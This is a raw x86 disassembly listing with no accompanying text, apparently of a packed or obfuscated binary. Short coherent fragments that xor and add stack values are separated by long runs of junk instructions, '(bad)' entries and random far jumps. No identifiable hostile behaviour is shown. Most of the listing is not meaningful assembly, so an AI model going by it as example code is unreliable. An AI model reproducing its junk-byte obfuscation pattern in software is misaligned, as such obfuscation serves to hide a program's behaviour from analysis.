  40198d:	jmp    DWORD PTR [ecx+0x23]
  401990:	outs   dx,BYTE PTR ds:[esi]
  401991:	xlat   BYTE PTR ds:[ebx]
  401992:	jmp    0x401953
  401994:	sbb    eax,0x5d6bb800
  401999:	inc    esp
  40199a:	xor    esi,DWORD PTR [ebx+0x45f4f671]
  4019a0:	inc    eax
  4019a1:	or     edx,esi
  4019a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019a4:	push   edi
  4019a5:	pop    esp
  4019a6:	mov    edx,0x87ce3879
  4019ab:	sbb    DWORD PTR [ecx+eax*1+0x7],esi
  4019af:	adc    al,0x92
  4019b1:	mov    esi,0x66b54323
  4019b6:	aas    
  4019b7:	shl    DWORD PTR [ecx-0x1bedb62f],1
  4019bd:	int    0xdc
  4019bf:	xchg   ecx,eax
  4019c0:	ret    
  4019c1:	retf   
  4019c2:	adc    ecx,DWORD PTR [ebp+0x62]
  4019c5:	fwait
  4019c6:	mov    BYTE PTR [ebx+ebx*8+0x38],al
  4019ca:	mov    bl,0xf7
  4019cc:	cmc    
  4019cd:	inc    ebx
  4019ce:	jne    0x401a1b
  4019d0:	pop    eax
  4019d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019d2:	jl     0x4019aa
  4019d4:	in     eax,dx
  4019d5:	sub    edi,DWORD PTR [esi+0x42]
  4019d8:	addr16 mov bh,0x8a
  4019db:	ds dec edi
  4019dd:	into   
  4019de:	int3   
  4019df:	test   eax,0x192c9258
  4019e4:	cmc    
  4019e5:	inc    ecx
  4019e6:	jmp    0xd4be:0xee3dcfd1
  4019ed:	sbb    BYTE PTR [eax-0x10],dl
  4019f0:	mov    eax,0x262852e9
  4019f5:	test   BYTE PTR [ebp+0x381a4670],dl
  4019fb:	inc    ecx
  4019fc:	iret   
  4019fd:	sti    
  4019fe:	cmp    eax,0xe10356a0
  401a03:	mov    edx,0xd7b49282
  401a08:	jmp    0x4019ab
  401a0a:	pop    ss
  401a0b:	xchg   esi,eax
  401a0c:	loope  0x4019fd
  401a0e:	xor    al,dl
  401a10:	int3   
  401a11:	pop    ecx
  401a12:	test   eax,0xa5271b10
  401a17:	adc    BYTE PTR [edi+0x5a],0x4a
  401a1b:	int    0x79
  401a1d:	pushf  
  401a1e:	aas    
  401a1f:	aas    
  401a20:	jge    0x401a02
  401a22:	in     al,0x31
  401a24:	cwde   
  401a25:	sub    DWORD PTR [ebx],edi
  401a27:	call   0x3dde0327
  401a2c:	or     DWORD PTR [esi+0x113d13e9],edx
  401a32:	push   esi
  401a33:	mov    bl,0x7d
  401a35:	mov    DWORD PTR ds:0x5c12322b,0x4c56556f
  401a3f:	rol    DWORD PTR [ebx-0x49],0x2d
  401a43:	aaa    
  401a44:	pop    ecx
  401a45:	push   0x5a
  401a47:	ds fwait
  401a49:	mov    al,ds:0x558ef66d
  401a4e:	lock ja 0x401a6a
  401a51:	out    dx,al
  401a52:	aad    0x73
  401a54:	xor    ch,bl
  401a56:	mov    esi,eax
  401a58:	(bad)  
  401a59:	mov    al,ds:0x343239f6
  401a5e:	rol    BYTE PTR [ebp-0x79e1251b],cl
  401a64:	add    BYTE PTR [eax-0x2db1a42b],ah
  401a6a:	xchg   ebx,eax
  401a6b:	(bad)  
  401a6c:	jae    0x401a85
  401a6e:	pop    eax
  401a6f:	(bad)
  401a72:	add    dl,BYTE PTR [edx-0x7670c749]
  401a78:	pop    ebp
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	dec    ebp
  401a8c:	jl     0x401a4c
  401a8e:	pop    esp
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a5a
  401a98:	add    BYTE PTR [eax+0x5],bh
  401a9b:	cmp    ch,BYTE PTR [ecx+esi*1-0x1a]
  401a9f:	mov    ds:0x12c4cb22,eax
  401aa4:	nop
  401aa5:	dec    ebx
  401aa6:	mov    ebp,0x8b24034f
  401aab:	inc    ebx
  401aac:	xchg   DWORD PTR [ecx],ebx
  401aae:	jge    0x401a53
  401ab0:	mov    ah,0x5c
  401ab2:	lahf   
  401ab3:	retf   0x2a77
  401ab6:	fwait
  401ab7:	xchg   BYTE PTR [ebp+edx*2-0x78],ch
  401abb:	fsubr  DWORD PTR [esi+eiz*1]
  401abe:	and    al,0x5a
  401ac0:	shl    al,cl
  401ac2:	aam    0xf8
  401ac4:	in     al,dx
  401ac5:	jne    0x401b43
  401ac7:	jmp    0x401ad2
  401ac9:	sub    dh,BYTE PTR [edi+0x1f]
  401acc:	das    
  401acd:	pop    ax
  401acf:	dec    edx
  401ad0:	or     al,0x76
  401ad2:	dec    esp
  401ad3:	adc    eax,DWORD PTR [ecx]
  401ad5:	xor    BYTE PTR [ebx-0x3f],ah
  401ad8:	jbe    0x401a8d
  401ada:	aam    0xb
  401adc:	(bad)  
  401add:	(bad)  
  401adf:	call   0x8fdcfe6f
  401ae4:	mov    ecx,0x2d890812
  401ae9:	sbb    eax,DWORD PTR [ebx-0x7d]
  401aec:	add    DWORD PTR [edi-0x6],esi
  401aef:	addr16 push eax
  401af1:	(bad)  
  401af2:	push   ss
  401af3:	pop    ebx
  401af4:	mov    eax,ds:0x5a340112
  401af9:	mov    eax,0x1fe0071
  401afe:	outs   dx,DWORD PTR ds:[esi]
  401aff:	and    al,0xaf
  401b01:	imul   edi,DWORD PTR [edi+eiz*4],0x25
  401b05:	loop   0x401b7b
  401b07:	not    bh
  401b09:	inc    eax
  401b0a:	rcr    cl,0xf0
  401b0d:	ins    DWORD PTR es:[edi],dx
  401b0e:	sbb    ch,ch
  401b10:	push   ebx
  401b11:	inc    ebx
  401b12:	call   0x42ef:0x74976177
  401b19:	pop    esp
  401b1a:	or     edx,eax
  401b1c:	in     eax,0x6a
  401b1e:	imul   DWORD PTR [ecx]
  401b20:	retf   
  401b21:	mov    al,0x6
  401b23:	inc    al
  401b25:	daa    
  401b26:	pop    ecx
  401b28:	arpl   WORD PTR [edx-0x1927ee4a],cx
  401b2e:	xor    eax,0x9570d34f
  401b33:	ins    DWORD PTR es:[edi],dx
  401b34:	and    ch,bh
  401b36:	dec    ebp
  401b37:	(bad)  
  401b38:	js     0x401ba6
  401b3a:	push   cs
  401b3b:	and    ebx,DWORD PTR [ebp-0x4b3ff3c8]
  401b41:	xchg   edi,eax
  401b42:	push   edx
  401b43:	hlt    
  401b44:	mov    bh,0xb8
  401b46:	daa    
  401b47:	mov    eax,ds:0x82c162e3
  401b4c:	sub    ebx,ebx
  401b4e:	xchg   BYTE PTR [edx],ah
  401b50:	inc    edx
  401b51:	loope  0x401bb7
  401b53:	mov    ecx,0xfa79d5e7
  401b58:	sub    al,0x32
  401b5a:	stc    
  401b5b:	and    eax,0x5635335b
  401b60:	mov    ch,0x8e
  401b62:	mov    ebx,edi
  401b64:	xchg   edi,eax
  401b65:	fisttp WORD PTR [esi-0x71]
  401b68:	pop    ecx
  401b69:	gs (bad) 
  401b6b:	mov    esp,ecx
  401b6d:	ror    BYTE PTR ds:0x3ce6b254,0x78
  401b74:	out    0xf8,al
  401b76:	fcomp  QWORD PTR [eax+0x7a]
  401b79:	mov    esi,0xa022a124
  401b7e:	ror    BYTE PTR [edx-0x34bad47d],1
  401b84:	stos   DWORD PTR es:[edi],eax
  401b85:	pop    ebp
  401b86:	jge    0x401b2a
  401b88:	push   esp
  401b89:	sbb    dh,bh
  401b8b:	sub    al,0x52
  401b8d:	call   0x1a34:0xf09faa83
  401b94:	outs   dx,DWORD PTR ds:[esi]
  401b95:	int3   
  401b96:	adc    esi,DWORD PTR [eax+0x469c7ec]
  401b9c:	test   DWORD PTR [eax-0x30],0xbc8e3aa5
  401ba3:	sbb    bl,BYTE PTR [ebp+0x26655fc2]
  401ba9:	jnp    0x401bea
  401bab:	mov    bh,0xc4
  401bad:	repz xor al,0x4b
  401bb0:	repz shl DWORD PTR [eax+0x15],0x49
  401bb5:	nop
  401bb6:	call   DWORD PTR [ecx+0x1a]
  401bb9:	add    eax,0xc624b577
  401bbe:	mov    ds:0xac12f41,al
  401bc3:	mov    dl,dl
  401bc5:	test   esp,esi
  401bc7:	test   cl,ah
  401bc9:	push   eax
  401bca:	js     0x401c37
  401bcc:	out    dx,eax
  401bcd:	es push ebp
  401bcf:	test   DWORD PTR [esi],eax
  401bd1:	or     ah,BYTE PTR [ecx+0x3b]
  401bd4:	adc    ebp,DWORD PTR [ebp+0x28197d5f]
  401bda:	xchg   BYTE PTR [edx+0x77ab4e9b],cl
  401be0:	les    esi,FWORD PTR [ebp-0x6438af3d]
  401be6:	jl     0x401bd4
  401be8:	std    
  401be9:	call   0xf109:0x121ee111
  401bf0:	pop    edx
  401bf1:	sar    DWORD PTR [edx+0x78c335a4],0xa9
  401bf8:	jp     0x401c06
  401bfa:	lock mov ah,0x66
  401bfd:	daa    
  401bfe:	dec    eax
  401bff:	ja     0x401bc6
  401c01:	neg    DWORD PTR [esi]
  401c03:	sbb    ebx,DWORD PTR [edx-0x4b9dad41]
  401c09:	retf   0xf600
  401c0c:	call   0xf706:0x3467ec2b
  401c13:	ficomp DWORD PTR [eax+0x58ceb21b]
  401c19:	mov    dh,0xef
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	and    DWORD PTR [esi+0x798abc97],edx
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c49
  401c4d:	(bad)  
  401c4e:	xor    DWORD PTR [eax],eax
  401c50:	sbb    BYTE PTR [edi+edx*8+0x24],0xed
  401c55:	lock rcr BYTE PTR [esi+0x3db44126],cl
  401c5c:	mov    WORD PTR [esi],es
  401c5e:	xchg   ecx,eax
  401c5f:	mul    ebp
  401c61:	or     eax,0xfc2948df
  401c66:	test   DWORD PTR [ebx+0x2ed33ebb],0xd083d7c6
  401c70:	mov    ecx,0xfa38f82b
  401c75:	xchg   esi,eax
  401c76:	(bad)  
  401c77:	mov    esp,0x92dd3c63
  401c7c:	outs   dx,DWORD PTR ds:[esi]
  401c7d:	and    DWORD PTR [edi-0x22bbcfc9],ecx
  401c83:	sub    bl,0xbe
  401c86:	sub    eax,0x43a39fad
  401c8b:	inc    edi
  401c8c:	inc    edi
  401c8d:	mov    ah,0x40
  401c8f:	scas   al,BYTE PTR es:[edi]
  401c90:	jo     0x401c27
  401c92:	xchg   DWORD PTR [ebx+0x45],ebx
  401c95:	in     al,dx
  401c96:	mov    ds:0x37d8122d,eax
  401c9b:	mov    ah,0xce
  401c9d:	imul   ebp,DWORD PTR [edi-0x6ad4837f],0x1f
  401ca4:	cdq    
  401ca5:	(bad)  
  401ca6:	(bad)  
  401ca7:	xlat   BYTE PTR ds:[ebx]
  401ca8:	push   eax
  401ca9:	mov    bl,0xf6
  401cab:	test   BYTE PTR [ecx+0x30],0xf6
  401caf:	push   esi
  401cb0:	(bad)  
  401cb1:	mov    edi,0xbe7722c5
  401cb6:	and    DWORD PTR [edx-0x70c78453],eax
  401cbc:	mov    ch,BYTE PTR [esi-0xb]
  401cbf:	cli    
  401cc0:	dec    ebp
  401cc1:	psrld  mm4,QWORD PTR [edi-0x8ed44d3]
  401cc8:	fiadd  DWORD PTR [eax+0x63]
  401ccc:	cmp    bh,bl
  401cce:	inc    ebx
  401ccf:	and    al,0xc8
  401cd1:	jge    0x401c8e
  401cd3:	stc    
  401cd4:	adc    ecx,DWORD PTR [edi]
  401cd6:	loope  0x401cce
  401cd8:	pop    edi
  401cd9:	mov    eax,ds:0x62658919
  401cde:	iret   
  401cdf:	sub    esp,DWORD PTR [ebx+0x8fc4af9]
  401ce5:	push   es
  401ce6:	(bad)  [edi-0x5f]
  401ce9:	pop    gs
  401ceb:	push   eax
  401cec:	dec    ebx
  401ced:	or     ch,BYTE PTR [esi-0x54eafcf8]
  401cf3:	push   ebx
  401cf4:	add    eax,ebx
  401cf6:	int3   
  401cf7:	mov    ch,bl
  401cf9:	push   edi
  401cfa:	lods   al,BYTE PTR ds:[esi]
  401cfb:	mov    gs,WORD PTR [esi+ebx*2-0x11]
  401cff:	repz pop esi
  401d01:	addr16 adc eax,0x6cf5362a
  401d07:	cdq    
  401d08:	lock and DWORD PTR [esi],ebp
  401d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d0c:	dec    esi
  401d0d:	mov    eax,0x13478315
  401d12:	rol    BYTE PTR [edi],1
  401d14:	push   0x5e
  401d16:	ins    DWORD PTR es:[edi],dx
  401d17:	mov    dl,0xd2
  401d19:	dec    esp
  401d1a:	xchg   ebx,eax
  401d1b:	test   eax,0x6cbaaa6
  401d20:	push   edi
  401d21:	fisub  DWORD PTR [eax-0x46017dd8]
  401d27:	jb     0x401d4c
  401d29:	cs loop 0x401da4
  401d2c:	pop    eax
  401d2d:	inc    ecx
  401d2e:	push   0x2038aa72
  401d33:	xchg   ecx,eax
  401d34:	xor    edi,DWORD PTR [ecx+0x79]
  401d37:	xor    al,0x96
  401d39:	or     ecx,DWORD PTR [esi]
  401d3b:	iret   
  401d3c:	arpl   WORD PTR [ebp+0x53],cx
  401d3f:	mov    esp,DWORD PTR [eax]
  401d41:	pop    esp
  401d42:	mov    BYTE PTR [ecx+eax*4+0x552063db],bh
  401d49:	stc    
  401d4a:	mov    edi,0x3efcca2a
  401d4f:	jb     0x401d01
  401d51:	mov    edi,0x671698aa
  401d56:	das    
  401d57:	mov    dl,0xf1
  401d59:	call   0xb9f6:0x66d6577d
  401d60:	jmp    0x7eb558ab
  401d65:	aas    
  401d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d67:	or     dh,0xea
  401d6a:	cmp    eax,ebx
  401d6c:	out    0xa0,eax
  401d6e:	inc    esi
  401d6f:	aas    
  401d70:	sti    
  401d71:	pop    es
  401d72:	outs   dx,DWORD PTR ds:[esi]
  401d73:	or     bh,BYTE PTR [edx+0x49d444e1]
  401d79:	jle    0x401d42
  401d7b:	sub    BYTE PTR [esi],bl
  401d7d:	icebp  
  401d7e:	in     eax,0xe2
  401d80:	sahf   
  401d81:	fimul  WORD PTR [edx+esi*4+0x10]
  401d85:	pop    esp
  401d86:	mov    edx,0xa695af42
  401d8b:	icebp  
  401d8c:	in     al,0x48
  401d8e:	cs jbe 0x401d4f
  401d91:	add    edx,edx
  401d93:	and    ebp,DWORD PTR ds:0x223639db
  401d99:	test   eax,0x90f33103
  401d9e:	call   0x7af6ede7
  401da3:	mov    dl,0xa1
  401da5:	mov    esi,0x76bad459
  401daa:	adc    al,0x51
  401dac:	pop    ebp
  401dad:	ins    DWORD PTR es:[edi],dx
  401dae:	icebp  
  401daf:	sbb    al,0xf
  401db1:	jno    0x401dec
  401db3:	in     eax,dx
  401db4:	or     BYTE PTR [esi-0x4c],0x8c
  401db8:	xchg   edx,eax
  401db9:	add    ah,ch
  401dbb:	dec    eax
  401dbc:	loopne 0x401dd6
  401dbe:	es ins BYTE PTR es:[edi],dx
  401dc0:	sbb    dl,bh
  401dc2:	jmp    0x8aa1726b
  401dc7:	dec    esp
  401dc8:	adc    eax,0xf23f772f
  401dcd:	xchg   edx,eax
  401dce:	shl    al,0x3
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x63158938],ebp
  401e0d:	rcl    DWORD PTR [esi],0x7
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dd3
  401e17:	test   al,0x5d
  401e19:	sbb    eax,0x75240887
  401e1e:	cmovb  ecx,DWORD PTR [edx+0x5f28ed0b]
  401e25:	dec    esi
  401e26:	mov    ebx,0x94ac67d
  401e2b:	xchg   ah,dh
  401e2d:	repz data16 and dh,BYTE PTR [esi-0x7a]
  401e32:	call   0x31e7c82d
  401e37:	outs   dx,BYTE PTR ds:[esi]
  401e38:	cmp    eax,0x53dbd5fd
  401e3d:	dec    ecx
  401e3e:	add    eax,0x85da1548
  401e43:	pop    ebp
  401e44:	js     0x401e48
  401e46:	cdq    
  401e47:	sub    al,0x26
  401e49:	sahf   
  401e4a:	je     0x401e03
  401e4c:	xor    esp,edx
  401e4e:	pop    ss
  401e4f:	ret    
  401e50:	xchg   DWORD PTR [ebx],esp
  401e52:	stos   DWORD PTR es:[edi],eax
  401e53:	xor    dl,ch
  401e55:	cmp    DWORD PTR [ebp-0x7e5d8f0e],0x4a
  401e5c:	leave  
  401e5d:	out    dx,eax
  401e5e:	push   eax
  401e5f:	shr    BYTE PTR ds:0x8593db31,cl
  401e65:	les    esp,FWORD PTR [eax-0x7]
  401e68:	out    0xf9,al
  401e6a:	popa   
  401e6b:	and    eax,DWORD PTR [ebx]
  401e6d:	mov    ds:0x78e79b5c,eax
  401e72:	inc    eax
  401e73:	mov    dh,0x66
  401e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e76:	add    eax,0x1d27ca33
  401e7b:	out    0x5,al
  401e7d:	(bad)  
  401e7e:	cmp    BYTE PTR [eax-0x12],bh
  401e81:	ss mov bl,0x9d
  401e84:	sar    BYTE PTR [esi-0x21b89c0c],0x99
  401e8b:	fdiv   DWORD PTR [edx]
  401e8d:	adc    BYTE PTR [ebp+0x37],dl
  401e90:	mov    bh,0xb6
  401e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e93:	nop
  401e94:	cs je  0x401e6c
  401e97:	xchg   esi,eax
  401e98:	rcr    ecx,0x79
  401e9b:	not    BYTE PTR [ecx]
  401e9d:	jae    0x401e95
  401e9f:	sub    al,0x77
  401ea1:	add    eax,0xd3283efd
  401ea6:	fcmovnu st,st(2)
  401ea8:	mov    si,0xbd6b
  401eac:	xchg   edi,eax
  401ead:	iret   
  401eae:	mov    fs,WORD PTR [edx]
  401eb0:	push   edx
  401eb1:	inc    eax
  401eb2:	xor    ebp,DWORD PTR [ebp+0x603a7938]
  401eb8:	inc    edx
  401eb9:	xor    DWORD PTR [ebx],edx
  401ebb:	les    ebx,FWORD PTR [ebp+0x5c]
  401ebe:	push   0x160b7334
  401ec3:	imul   esi,DWORD PTR [edx-0x9],0xfb04fd4f
  401eca:	fidiv  DWORD PTR [edi]
  401ecc:	fwait
  401ecd:	leave  
  401ece:	push   ecx
  401ecf:	retf   
  401ed0:	jo     0x401efb
  401ed2:	push   edx
  401ed3:	and    eax,0x844f438b
  401ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed9:	add    BYTE PTR [ecx],0xf
  401edc:	adc    eax,0xaf5b2df5
  401ee1:	call   0x7361:0xf93a6f3e
  401ee8:	jecxz  0x401f55
  401eea:	mov    edi,ss
  401eec:	rcr    DWORD PTR [ebx+edi*8],cl
  401eef:	mov    esp,0x99a52341
  401ef4:	mov    ch,0xb2
  401ef6:	(bad)  
  401ef7:	or     al,0x63
  401ef9:	dec    edx
  401efa:	dec    ecx
  401efb:	cdq    
  401efc:	cmp    edi,DWORD PTR [esi]
  401efe:	dec    edi
  401eff:	fisub  WORD PTR [edi-0x56]
  401f02:	inc    ecx
  401f03:	sub    DWORD PTR [esi+0x48],0x7ca1a571
  401f0a:	aaa    
  401f0b:	mov    al,0x5e
  401f0d:	mov    BYTE PTR [eax+eax*4+0x7cbf9d9b],dl
  401f14:	in     al,0x7a
  401f16:	sar    DWORD PTR [ebx-0x7f],1
  401f19:	ret    0x2a9b
  401f1c:	fcomp  QWORD PTR [edi+0x5a9f39f2]
  401f22:	or     al,0xe0
  401f24:	sbb    BYTE PTR [edx-0x76],bl
  401f27:	xchg   DWORD PTR [ebx+eiz*4],ebp
  401f2a:	sbb    al,0x92
  401f2c:	dec    edi
  401f2d:	retf   0xa898
  401f30:	add    al,0xa5
  401f32:	frstor [eax]
  401f34:	shl    ebp,cl
  401f36:	sbb    bh,BYTE PTR [ebx+ecx*1]
  401f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3a:	inc    esi
  401f3b:	jl     0x401f15
  401f3d:	jne    0x401f6c
  401f3f:	jmp    0x401f15
  401f41:	cmp    DWORD PTR [ecx-0x3d3ea98],0x8680f62e
  401f4b:	arpl   ax,bp
  401f4d:	rcr    DWORD PTR [edi+edi*1-0x14],0xf0
  401f52:	mov    al,0xdd
  401f54:	imul   esp,DWORD PTR [ecx+0x15356c2],0x61
  401f5b:	mov    edi,0x5656ecf6
  401f60:	jmp    0x54cb:0x336b5b3b
  401f67:	aaa    
  401f68:	ins    BYTE PTR es:[edi],dx
  401f69:	or     DWORD PTR [ecx-0x75af461e],0xffffff9c
  401f70:	std    
  401f71:	stc    
  401f72:	into   
  401f73:	mov    esp,0xddc000d6
  401f78:	loopne 0x401f49
  401f7a:	mov    edx,0xd9bb4db7
  401f7f:	std    
  401f80:	xor    edx,DWORD PTR [ebx]
  401f82:	data16 cmc 
  401f84:	dec    ebx
  401f85:	repz fstp TBYTE PTR [eax+0x52]
  401f89:	dec    edx
  401f8a:	and    esp,ebp
  401f8c:	test   eax,0x9cae8fac
  401f91:	jbe    0x401fdc
  401f93:	inc    ecx
  401f94:	movq   QWORD PTR [esi+0x32],mm3
  401f98:	and    BYTE PTR [esi+0xf],bl
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xc88f3073
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x40201d
  401fcc:	std    
  401fcd:	pop    edi
  401fce:	add    al,0x71
  401fd0:	pop    edi
  401fd1:	mov    ebx,0x988e67d9
  401fd6:	sti    
  401fd7:	jge    0x40204e
  401fd9:	and    BYTE PTR [edi],bh
  401fdb:	ror    eax,1
  401fdd:	scas   eax,DWORD PTR es:[edi]
  401fde:	and    edi,DWORD PTR [ecx]
  401fe0:	fwait
  401fe1:	inc    ebp
  401fe2:	xchg   ecx,eax
  401fe3:	sbb    edx,ecx
  401fe5:	js     0x402064
  401fe7:	sbb    esp,edi
  401fe9:	fs jne 0x401fee
  401fec:	xor    BYTE PTR [eax-0x16],bh
  401fef:	out    dx,al
  401ff0:	ret    
  401ff1:	mov    esi,?
  401ff3:	dec    esi
  401ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff5:	repnz addr16 test eax,0x332cae90
  401ffc:	jmp    0x16d2:0x3d90c4e7
  402003:	es test eax,0x3f51537a
  402009:	jae    0x401fea
  40200b:	bound  ebx,QWORD PTR [eax+ebx*8+0x3e5b7325]
  402012:	cwde   
  402013:	pusha  
  402014:	sub    DWORD PTR [esi-0x69691d6d],0x65
  40201b:	fucomip st,st(1)
  40201d:	pop    es
  40201e:	or     DWORD PTR ss:[esi+esi*4+0x3d],esp
  402023:	sbb    edi,DWORD PTR [edi]
  402025:	test   DWORD PTR [eax+0x59],eax
  402028:	jge    0x402097
  40202a:	jns    0x40209a
  40202c:	in     al,0x89
  40202e:	sar    BYTE PTR [esi+0x22f39679],1
  402034:	test   DWORD PTR [esi-0x169ca890],edx
  40203a:	add    eax,0x4a71b78f
  40203f:	mov    ebp,esp
  402041:	neg    ah
  402043:	xor    al,0x4
  402045:	jle    0x401fcd
  402047:	mov    ds,WORD PTR [eax-0x201d1063]
  40204d:	outs   dx,DWORD PTR ds:[esi]
  40204e:	xor    eax,DWORD PTR [ebx-0x100325d7]
  402054:	rcr    DWORD PTR [edx-0x1173e7f4],cl
  40205a:	ret    
  40205b:	jae    0x402078
  40205d:	retf   0x8856
  402060:	sbb    eax,0xed2d95af
  402065:	loopne 0x401fff
  402067:	push   cs
  402068:	push   es
  402069:	xchg   edx,eax
  40206a:	push   eax
  40206b:	leave  
  40206c:	ins    DWORD PTR es:[edi],dx
  40206d:	stc    
  40206e:	push   ebp
  40206f:	pusha  
  402070:	aad    0x7f
  402072:	inc    ebx
  402073:	fld    TBYTE PTR [edx]
  402075:	push   es
  402076:	xor    al,0x91
  402078:	imul   edx,DWORD PTR [esi-0x3fb91c12],0x4
  40207f:	std    
  402080:	outs   dx,BYTE PTR ds:[esi]
  402081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402082:	aaa    
  402083:	jnp    0x4020c6
  402085:	mov    cl,0xc7
  402087:	mov    esp,ebp
  402089:	stc    
  40208a:	and    ebx,DWORD PTR [esi+ebp*8-0x28]
  40208e:	loop   0x402076
  402090:	int    0x6d
  402092:	repnz xlat BYTE PTR ds:[ebx]
  402094:	sahf   
  402095:	add    DWORD PTR [ebp+0x653b0f86],esp
  40209b:	(bad)  
  40209c:	lea    edi,[ecx-0x33]
  40209f:	popa   
  4020a0:	jmp    0xb220:0x21c319cc
  4020a7:	aas    
  4020a8:	clc    
  4020a9:	xor    bh,BYTE PTR [eax+0x5dac969a]
  4020af:	mul    esi
  4020b1:	push   bx
  4020b3:	adc    al,0x65
  4020b5:	aaa    
  4020b6:	adc    bl,BYTE PTR [esi+ebx*1-0x42]
  4020ba:	mov    al,0x7e
  4020bc:	and    DWORD PTR [ebp-0x3c3f11cb],edi
  4020c2:	cwde   
  4020c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020c4:	dec    ebp
  4020c5:	sub    BYTE PTR [edi+0x700ba4d8],bl
  4020cb:	xor    eax,0xf2ef64a5
  4020d0:	xor    DWORD PTR [ebp+0x64],esi
  4020d3:	mov    dh,dl
  4020d5:	cmp    dl,bl
  4020d7:	sbb    bl,bl
  4020d9:	xchg   ebp,eax
  4020da:	jecxz  0x40209d
  4020dc:	xor    ax,0xb885
  4020e0:	add    eax,0xb0572ad
  4020e5:	mov    al,0xe3
  4020e7:	sub    ebp,DWORD PTR [edx-0x72]
  4020ea:	add    edi,DWORD PTR ss:[ecx]
  4020ed:	xchg   BYTE PTR [edx],al
  4020ef:	enter  0x3249,0xf9
  4020f3:	pop    ds
  4020f4:	add    BYTE PTR [ebx],al
  4020f6:	pop    ds
  4020f7:	sti    
  4020f8:	jecxz  0x40207f
  4020fa:	pop    ss
  4020fb:	test   DWORD PTR [edx-0x4b],ebp
  4020fe:	div    DWORD PTR [esi-0x6af9d90d]
  402104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402105:	call   0xb6b57a71
  40210a:	into   
  40210b:	mov    eax,ds:0x5d0a600
  402110:	in     eax,dx
  402111:	ror    BYTE PTR [edx],0xbd
  402114:	scas   eax,DWORD PTR es:[di]
  402116:	xchg   BYTE PTR [edx+0x7bb82572],al
  40211c:	sub    DWORD PTR ds:[edi],edx
  40211f:	in     eax,dx
  402120:	dec    edx
  402121:	jns    0x402165
  402123:	outs   dx,DWORD PTR ds:[esi]
  402124:	jmp    0x4020ce
  402126:	jmp    0x235e66a2
  40212b:	outs   dx,BYTE PTR ds:[esi]
  40212c:	pushf  
  40212d:	adc    edx,DWORD PTR [esi+0x26193ce5]
  402133:	sbb    edx,DWORD PTR [edi-0x63e40457]
  402139:	in     eax,0xd8
  40213b:	cdq    
  40213c:	(bad)  
  40213e:	clc    
  40213f:	adc    DWORD PTR [ebp-0x1e],eax
  402142:	call   0x5d08:0xdbd18f37
  402149:	dec    eax
  40214a:	fdiv   st(0),st
  40214c:	jg     0x402127
  40214e:	enter  0x8b50,0x45
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	stc    
  40216a:	inc    edi
  40216b:	jae    0x4021c4
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
